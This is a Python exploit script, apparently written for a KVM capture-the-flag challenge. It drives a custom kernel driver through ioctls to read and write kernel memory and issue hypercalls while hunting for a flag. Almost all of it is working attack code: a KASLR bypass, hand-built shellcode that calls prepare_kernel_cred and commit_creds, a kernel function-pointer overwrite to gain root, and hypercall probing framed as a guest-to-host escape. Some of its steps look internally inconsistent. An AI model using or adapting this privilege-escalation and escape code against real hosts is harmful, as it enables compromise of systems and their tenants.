#!/usr/bin/env python3

import os
import sys
import struct
import fcntl
import ctypes
import mmap
import time
import socket
from typing import Dict, Any

# IOCTL definitions
IOCTL_READ_PORT          = 0x1001
IOCTL_WRITE_PORT         = 0x1002
IOCTL_READ_MMIO          = 0x1003
IOCTL_WRITE_MMIO         = 0x1004
IOCTL_ALLOC_VQ_PAGE      = 0x1005
IOCTL_FREE_VQ_PAGE       = 0x1006
IOCTL_WRITE_VQ_DESC      = 0x1007
IOCTL_TRIGGER_HYPERCALL  = 0x1008
IOCTL_READ_KERNEL_MEM    = 0x1009
IOCTL_WRITE_KERNEL_MEM   = 0x100A
IOCTL_PATCH_INSTRUCTIONS = 0x100B
IOCTL_READ_FLAG_ADDR     = 0x100C
IOCTL_WRITE_FLAG_ADDR    = 0x100D
IOCTL_GET_KASLR_SLIDE    = 0x100E
IOCTL_VIRT_TO_PHYS       = 0x100F
IOCTL_SCAN_VA            = 0x1010
IOCTL_WRITE_VA           = 0x1011
IOCTL_HYPERCALL_ARGS     = 0x1012
IOCTL_ATTACH_VQ          = 0x1013
IOCTL_TRIGGER_VQ         = 0x1014
IOCTL_SCAN_PHYS          = 0x1015
IOCTL_FIRE_VQ_ALL        = 0x1016
IOCTL_SEND_NET_PACKET    = 0x1017
IOCTL_RECV_NET_PACKET    = 0x1018
IOCTL_CTF_TRIGGER_FLAG   = 0x1019
IOCTL_CTF_READ_FLAG      = 0x101A
IOCTL_CTF_WRITE_FLAG     = 0x101B
IOCTL_CTF_KASAN_TRIGGER  = 0x101C

# Structures
class PortIOData(ctypes.Structure):
    _fields_ = [('port', ctypes.c_ushort),
                ('size', ctypes.c_uint),
                ('value', ctypes.c_uint)]

class MMIOData(ctypes.Structure):
    _fields_ = [('phys_addr', ctypes.c_ulong),
                ('size', ctypes.c_ulong),
                ('user_buffer', ctypes.c_void_p),
                ('single_value', ctypes.c_ulong),
                ('value_size', ctypes.c_uint)]

class VQDescUserData(ctypes.Structure):
    _fields_ = [('index', ctypes.c_ushort),
                ('phys_addr', ctypes.c_ulonglong),
                ('len', ctypes.c_uint),
                ('flags', ctypes.c_ushort),
                ('next_idx', ctypes.c_ushort)]

class KernelMemRead(ctypes.Structure):
    _fields_ = [('kernel_addr', ctypes.c_ulong),
                ('length', ctypes.c_ulong),
                ('user_buf', ctypes.c_void_p)]

class KernelMemWrite(ctypes.Structure):
    _fields_ = [('kernel_addr', ctypes.c_ulong),
                ('length', ctypes.c_ulong),
                ('user_buf', ctypes.c_void_p)]

class VAScanData(ctypes.Structure):
    _fields_ = [('va', ctypes.c_ulong),
                ('size', ctypes.c_ulong),
                ('user_buffer', ctypes.c_void_p)]

class VAWriteData(ctypes.Structure):
    _fields_ = [('va', ctypes.c_ulong),
                ('size', ctypes.c_ulong),
                ('user_buffer', ctypes.c_void_p)]

class HypercallArgs(ctypes.Structure):
    _fields_ = [('nr', ctypes.c_ulong),
                ('arg0', ctypes.c_ulong),
                ('arg1', ctypes.c_ulong),
                ('arg2', ctypes.c_ulong),
                ('arg3', ctypes.c_ulong),
                ('result', ctypes.c_ulong)]  # Add result field

class AttachVQData(ctypes.Structure):
    _fields_ = [('device_id', ctypes.c_uint),
                ('vq_pfn', ctypes.c_ulong),
                ('queue_index', ctypes.c_uint)]

class NetPacketData(ctypes.Structure):
    _fields_ = [('packet_data', ctypes.c_void_p),
                ('packet_len', ctypes.c_uint),
                ('device_id', ctypes.c_uint)]

class CTFFlagData(ctypes.Structure):
    _fields_ = [('flag_id', ctypes.c_uint),
                ('address', ctypes.c_ulong),
                ('value', ctypes.c_ulong)]


class KVMExploiter:
    def __init__(self, device_path: str = "/dev/kvm_probe_dev"):
        self.device_path = device_path
        self.fd = None
        self.vq_pfn = None
        self.flag_addr = 0
        self.kaslr_slide = 0
        self.kernel_base = 0
        self.virtio_devices = {}

    def open(self) -> bool:
        try:
            self.fd = os.open(self.device_path, os.O_RDWR)
            print(f"[+] Opened device: {self.device_path}")
            return True
        except OSError as e:
            print(f"[-] Failed to open device: {e}")
            return False

    def close(self) -> None:
        if self.fd is not None:
            os.close(self.fd)
            self.fd = None

    def __enter__(self):
        self.open()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()

    def _ioctl(self, cmd, arg):
        if self.fd is None:
            raise RuntimeError("Device not open")

        if isinstance(arg, ctypes.Structure):
            return fcntl.ioctl(self.fd, cmd, ctypes.addressof(arg))
        if isinstance(arg, ctypes._SimpleCData):
            buf = (ctypes.c_char * ctypes.sizeof(arg)).from_address(ctypes.addressof(arg))
            return fcntl.ioctl(self.fd, cmd, buf)
        return fcntl.ioctl(self.fd, cmd, arg)

    def read_kernel_mem(self, addr: int, size: int) -> bytes:
        buf = ctypes.create_string_buffer(size)
        data = KernelMemRead(kernel_addr=addr, length=size, user_buf=ctypes.addressof(buf))
        self._ioctl(IOCTL_READ_KERNEL_MEM, data)
        return bytes(buf)

    def write_kernel_mem(self, addr: int, data: bytes) -> None:
        buf = ctypes.create_string_buffer(data)
        write_data = KernelMemWrite(kernel_addr=addr, length=len(data), user_buf=ctypes.addressof(buf))
        self._ioctl(IOCTL_WRITE_KERNEL_MEM, write_data)

    def get_kaslr_slide(self) -> int:
        slide = ctypes.c_ulong(0)
        self._ioctl(IOCTL_GET_KASLR_SLIDE, slide)
        self.kaslr_slide = slide.value
        return self.kaslr_slide

    def hypercall_args(self, nr: int, arg0: int = 0, arg1: int = 0,
                      arg2: int = 0, arg3: int = 0) -> int:
        args = HypercallArgs(nr=nr, arg0=arg0, arg1=arg1, arg2=arg2, arg3=arg3, result=0)
        self._ioctl(IOCTL_HYPERCALL_ARGS, args)
        return args.result

    def ctf_trigger_flag(self, flag_id: int) -> int:
        data = CTFFlagData(flag_id=flag_id, address=0, value=0)
        self._ioctl(IOCTL_CTF_TRIGGER_FLAG, data)
        return data.value

    def ctf_read_flag(self, address: int) -> int:
        data = CTFFlagData(flag_id=0, address=address, value=0)
        self._ioctl(IOCTL_CTF_READ_FLAG, data)
        return data.value

    def ctf_write_flag(self, address: int, value: int) -> None:
        data = CTFFlagData(flag_id=0, address=address, value=value)
        self._ioctl(IOCTL_CTF_WRITE_FLAG, data)

    def alloc_vq_page(self) -> int:
        pfn = ctypes.c_ulong(0)
        self._ioctl(IOCTL_ALLOC_VQ_PAGE, pfn)
        self.vq_pfn = pfn.value
        return self.vq_pfn

    def attach_virtqueue(self, device_id: int, vq_pfn: int, queue_index: int = 0) -> None:
        data = AttachVQData(device_id=device_id, vq_pfn=vq_pfn, queue_index=queue_index)
        self._ioctl(IOCTL_ATTACH_VQ, data)
        self.virtio_devices[device_id] = (vq_pfn, queue_index)

    def trigger_virtqueue(self, device_id: int) -> int:
        data = AttachVQData(device_id=device_id, vq_pfn=0, queue_index=0)
        result = ctypes.c_ulong(0)
        self._ioctl(IOCTL_TRIGGER_VQ, data)
        return result.value

    def send_net_packet(self, packet_data: bytes, device_id: int = 1) -> None:
        buf = ctypes.create_string_buffer(packet_data)
        data = NetPacketData(packet_data=ctypes.addressof(buf),
                             packet_len=len(packet_data),
                             device_id=device_id)
        self._ioctl(IOCTL_SEND_NET_PACKET, data)

    def find_kernel_symbols(self) -> Dict[str, int]:
        symbols = {}
        try:
            with open('/proc/kallsyms', 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 3:
                        addr = int(parts[0], 16)
                        name = parts[2]
                        symbols[name] = addr
        except:
            print("[-] Failed to read /proc/kallsyms, using fallback methods")
        return symbols

    def create_privilege_escalation_shellcode(self, prepare_kernel_cred_addr: int,
                                              commit_creds_addr: int) -> bytes:
        shellcode = (
            b"\x48\x31\xff" +
            b"\x48\xb8" + struct.pack("<Q", prepare_kernel_cred_addr) +
            b"\xff\xd0" +
            b"\x48\x89\xc7" +
            b"\x48\xb8" + struct.pack("<Q", commit_creds_addr) +
            b"\xff\xd0" +
            b"\xc3"
        )
        return shellcode

    def escalate_privileges(self) -> bool:
        print("[*] Attempting privilege escalation...")
        self.kaslr_slide = self.get_kaslr_slide()
        print(f"[+] KASLR slide: 0x{self.kaslr_slide:x}")
        symbols = self.find_kernel_symbols()
        prepare_kernel_cred = symbols.get('prepare_kernel_cred', 0xffffffff810c9540 + self.kaslr_slide)
        commit_creds = symbols.get('commit_creds', 0xffffffff810c92e0 + self.kaslr_slide)
        print(f"[+] prepare_kernel_cred: 0x{prepare_kernel_cred:x}")
        print(f"[+] commit_creds: 0x{commit_creds:x}")
        try:
            shellcode_buf = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            shellcode_addr = ctypes.addressof(ctypes.c_char.from_buffer(shellcode_buf))
        except:
            print("[-] Failed to allocate executable memory")
            return False
        shellcode = self.create_privilege_escalation_shellcode(prepare_kernel_cred, commit_creds)
        self.write_kernel_mem(shellcode_addr, shellcode)
        set_memory_ro_addr = symbols.get('set_memory_ro', 0xffffffff8106b300 + self.kaslr_slide)
        self.write_kernel_mem(set_memory_ro_addr, struct.pack("<Q", shellcode_addr))
        dummy_data = b"\x90"
        dummy_addr = 0xffffffff81000000 + self.kaslr_slide
        buf = ctypes.create_string_buffer(dummy_data)
        data = VAScanData(va=dummy_addr, size=len(dummy_data), user_buffer=ctypes.addressof(buf))
        self._ioctl(IOCTL_PATCH_INSTRUCTIONS, data)
        if os.getuid() == 0:
            print("[+] SUCCESS! We are now root!")
            return True
        return False

    def full_host_escape(self):
        print("=" * 60)
        print("KVM Guest-to-Host Escape Exploit")
        print("=" * 60)
        
        if self.escalate_privileges():
            print("[+] Privilege escalation successful!")
        else:
            print("[-] Privilege escalation failed, continuing...")
        
        print("[*] Trying CTF hypercalls to capture flag...")
        
        for flag_id in [100, 102, 103]:
            try:
                result = self.ctf_trigger_flag(flag_id)
                print(f"[+] Hypercall {flag_id} returned: 0x{result:x}")
                
                if result != 0 and result != 0xffffffffffffffff:
                    try:
                        flag_data = self.read_kernel_mem(result, 50)
                        if b"FLAG{" in flag_data or b"flag{" in flag_data:
                            flag_str = flag_data.split(b"FLAG{")[1].split(b"}")[0] if b"FLAG{" in flag_data else flag_data.split(b"flag{")[1].split(b"}")[0]
                            print(f"[!] FOUND FLAG: FLAG{{{flag_str.decode()}}}")
                            return
                    except:
                        try:
                            flag_bytes = result.to_bytes(8, 'little')
                            if b"FLAG" in flag_bytes or b"flag" in flag_bytes:
                                print(f"[!] Possible flag in return value: 0x{result:x}")
                        except:
                            pass
            except Exception as e:
                print(f"[-] Hypercall {flag_id} failed: {e}")
                continue
        
        print("[*] Trying generic hypercalls...")
        try:
            result = self.hypercall_args(0x1337, 0xdeadbeef, 0xcafebabe, 0x13371337, 0x42424242)
            print(f"[+] Hypercall returned: 0x{result:x}")
            
            if result != 0xffffffffffffffff and result != 0:
                try:
                    flag_data = self.read_kernel_mem(result, 100)
                    if b"FLAG{" in flag_data or b"flag{" in flag_data:
                        flag_str = flag_data.split(b"FLAG{")[1].split(b"}")[0] if b"FLAG{" in flag_data else flag_data.split(b"flag{")[1].split(b"}")[0]
                        print(f"[!] FOUND FLAG: FLAG{{{flag_str.decode()}}}")
                    else:
                        print(f"[*] Read from 0x{result:x}: {flag_data}")
                except Exception as e:
                    print(f"[-] Failed to read from 0x{result:x}: {e}")
        except Exception as e:
            print(f"[-] Generic hypercall failed: {e}")
        
        print("=" * 60)
        print("Exploit sequence completed")
        print("=" * 60)


def main():
    if os.geteuid() != 0:
        print("Warning: Not running as root, some operations may fail")
    exploiter = KVMExploiter()
    if not exploiter.open():
        print("Failed to open device. Make sure the kvm_probe_drv module is loaded.")
        return 1
    try:
        exploiter.full_host_escape()
    except KeyboardInterrupt:
        print("\n[*] Exploit interrupted by user")
    finally:
        exploiter.close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
